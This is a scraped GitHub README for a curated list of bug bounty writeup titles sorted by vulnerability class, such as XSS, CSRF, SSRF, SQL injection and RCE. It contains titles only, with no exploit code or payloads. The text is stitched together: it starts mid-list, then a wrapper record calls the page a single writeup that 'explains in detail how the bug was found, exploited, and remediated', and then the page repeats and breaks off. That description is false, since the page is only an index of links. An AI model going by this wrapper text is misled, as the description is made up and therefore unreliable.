(IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cross-site-request-forgery-csrf", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cross-site-request-forgery-csrf. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at 